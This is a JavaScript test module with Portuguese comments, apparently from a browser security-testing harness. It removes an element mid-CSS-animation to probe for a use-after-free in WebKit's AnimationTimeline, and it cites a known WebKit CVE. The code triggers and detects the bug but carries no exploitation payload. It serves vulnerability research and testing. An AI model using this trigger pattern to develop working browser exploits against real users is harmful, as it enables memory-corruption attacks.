/**
 * SC_CSS_ANIM_REMOVED.JS
 * Categoria : DOM/STYLE — Use-After-Free
 * Alvo      : WebCore::AnimationTimeline / CSSAnimation lifecycle
 * Técnica   : Inicia uma animação CSS num elemento, remove o elemento
 *             do DOM durante o primeiro frame, e observa se callbacks
 *             de animação ainda disparam sobre o objeto C++ liberado.
 *             O AnimationTimeline pode manter uma referência "stale"
 *             ao elemento mesmo após remoção.
 * Referência: Similar ao CVE-2020-9802 (WebKit animation UAF)
 */

export default {
    id:          'CSS_ANIM_REMOVED',
    category:    'DOM/STYLE',
    risk:        'HIGH',
    description: 'AnimationTimeline mantém ref para elemento já removido. '
                + 'Dispara callbacks de animação pós-free para detectar UAF no C++.',

    /* ── estado interno ──────────────────────────────────────────────── */
    _el:             null,
    _container:      null,
    _styleTag:       null,
    _callbackCount:  0,
    _callbackPhase:  null,
    _animObj:        null,

    supported: function() {
        return typeof document !== 'undefined'
            && typeof CSSAnimation !== 'undefined';
    },

    /* ── setup ──────────────────────────────────────────────────────── */
    setup: async function() {
        this._callbackCount = 0;
        this._callbackPhase = null;

        // Injeta keyframes via <style>
        this._styleTag = document.createElement('style');
        this._styleTag.textContent = `
            @keyframes uaf-anim {
                0%   { transform: translateX(0px);   opacity: 1; }
                50%  { transform: translateX(100px); opacity: 0.5; }
                100% { transform: translateX(200px); opacity: 0; }
            }
            .uaf-target {
                animation: uaf-anim 0.1s linear 3;
                width: 10px; height: 10px;
                position: absolute; left: -9999px;
            }
        `;
        document.head.appendChild(this._styleTag);

        this._container = document.createElement('div');
        document.body.appendChild(this._container);

        this._el = document.createElement('div');
        this._el.className = 'uaf-target';

        // Registra handlers ANTES de adicionar ao DOM
        this._el.addEventListener('animationstart', (e) => {
            this._callbackCount++;
            this._callbackPhase = 'start';
            this._animObj = e.target.getAnimations?.()[0] ?? null;
        });
        this._el.addEventListener('animationiteration', () => {
            this._callbackCount++;
            this._callbackPhase = 'iteration';
        });
        this._el.addEventListener('animationend', () => {
            this._callbackCount++;
            this._callbackPhase = 'end';
        });

        this._container.appendChild(this._el);

        // Aguarda o primeiro frame para a animação começar
        await new Promise(r => requestAnimationFrame(r));
        await new Promise(r => requestAnimationFrame(r));
    },

    /* ── trigger ─────────────────────────────────────────────────────── */
    trigger: async function() {
        // Remove o elemento do DOM enquanto a animação está ativa
        this._el.remove();

        // Força layout para que o motor processo o estilo
        void document.body.offsetWidth;

        // Aguarda possível disparo de callbacks sobre o objeto liberado
        await new Promise(r => setTimeout(r, 50));
        await new Promise(r => requestAnimationFrame(r));
    },

    /* ── probes ──────────────────────────────────────────────────────── */
    probe: [
        // [0-3] estado do elemento após remoção
        s => s._el.isConnected,
        s => s._el.parentNode,
        s => s._el.style.animationPlayState,
        s => s._el.getAnimations?.().length ?? 0,

        // [4-6] callbacks — se callbackCount subiu após remoção = UAF
        s => s._callbackCount,
        s => s._callbackPhase,
        s => typeof s._callbackPhase,

        // [7-9] objeto de animação obtido no callback
        s => s._animObj?.playState ?? 'null',
        s => s._animObj?.effect?.target === s._el,
        s => typeof s._animObj,

        // [10-11] integridade do container
        s => s._container.isConnected,
        s => s._container.children.length,
    ],

    /* ── cleanup ─────────────────────────────────────────────────────── */
    cleanup: async function() {
        this._container?.remove();
        this._styleTag?.remove();
        this._container    = null;
        this._el           = null;
        this._styleTag     = null;
        this._animObj      = null;
        this._callbackCount = 0;
        this._callbackPhase = null;
    }
};
